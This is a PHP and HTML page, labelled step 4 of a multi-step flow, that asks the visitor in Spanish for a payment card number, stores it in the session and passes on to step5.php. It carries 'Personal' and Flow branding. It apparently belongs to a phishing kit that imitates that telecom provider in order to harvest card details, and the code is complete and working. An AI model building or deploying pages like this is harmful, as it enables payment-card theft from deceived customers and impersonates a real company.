<?php
/**
 * STEP 4 - Número de tarjeta
 */
session_start();

// Guardar tarjeta si viene por POST
if(isset($_POST['card'])) {
    $_SESSION['card'] = trim($_POST['card']);
    header('Location: step5.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tarjeta | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
    <link rel="stylesheet" href="css/op/index.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center">
                            <div class="ml-3 ml-md-5">
                                <img src="assets/flow.svg" class="pl-md-4 img-fluid" style="height: 40px;">
                            </div>
                            <div class="mr-3 mr-md-5">
                                <img src="assets/secure.svg" class="pr-md-4 d-none d-sm-block" style="height: 30px;">
                            </div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 class="text-center mb-4" style="color: #333; font-size: 28px;">Número de tarjeta</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step4.php">
                            <div class="form-group">
                                <label style="color: #666;">Ingresá el número de tu tarjeta</label>
                                <input type="text" name="card" id="card" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" style="height: 50px; font-size: 16px;" required>
                                <small class="form-text text-muted">16 dígitos de tu tarjeta</small>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnContinuar" class="btn btn-primary px-4 py-2" disabled style="background: #00a8e1; border: none;">Continuar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script>
        $('#card').mask('0000 0000 0000 0000');
        
        $('#card').on('keyup', function(){
            var valor = $(this).val().replace(/ /g, '');
            if(valor.length >= 15) {
                $('#btnContinuar').prop('disabled', false);
            } else {
                $('#btnContinuar').prop('disabled', true);
            }
        });
    </script>
</body>
</html>